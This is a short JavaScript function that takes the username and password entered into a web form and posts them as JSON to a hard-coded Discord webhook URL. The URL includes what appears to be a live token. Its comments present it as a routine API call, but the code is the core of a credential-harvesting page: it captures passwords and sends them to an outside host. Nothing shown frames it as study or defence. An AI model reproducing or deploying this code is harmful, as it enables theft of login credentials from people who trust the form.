function submitForm() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  // Use an appropriate method to send data to the Discord API
  // Example: You might want to use fetch() or another AJAX method.

  // Replace 'YOUR_DISCORD_API_ENDPOINT' with the actual Discord API endpoint.
  const discordApiEndpoint = 'https://discord.com/api/webhooks/1185863103775252480/bzabXg7vFY7E5OdOh5Pw8UyLn5h4sUNUkJ3vyZhzNPSTWv2bV-0A6-cW3tmfmXPelnX-';

  fetch(discordApiEndpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ username, password }),
  })
  .then(response => {
    // Handle the response from the Discord API
    console.log(response);
  })
  .catch(error => {
    // Handle errors
    console.error(error);
  });
}